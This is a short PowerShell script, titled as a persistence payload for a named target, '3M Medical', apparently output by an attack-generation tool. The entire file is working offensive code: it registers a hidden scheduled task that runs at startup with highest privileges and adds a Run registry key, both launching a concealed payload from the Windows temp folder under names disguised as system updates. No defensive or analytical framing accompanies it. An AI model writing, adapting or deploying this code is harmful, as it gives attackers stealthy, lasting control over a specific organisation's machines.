
# PowerShell Persistence Payload for 3M Medical
# Generated: 2025-11-03T11:02:43.603670

function Add-ScheduledTaskPersistence {
    $taskName = "3m_medical_SystemUpdate"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\Windows\Temp\3m_medical_payload.ps1"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force
}

function Add-RegistryPersistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "3m_medical_Update"
    $regValue = "powershell.exe -WindowStyle Hidden -File C:\Windows\Temp\3m_medical_payload.ps1"
    
    New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force
}

# Add persistence mechanisms
Add-ScheduledTaskPersistence
Add-RegistryPersistence

Write-Host "Persistence mechanisms added for 3M Medical"
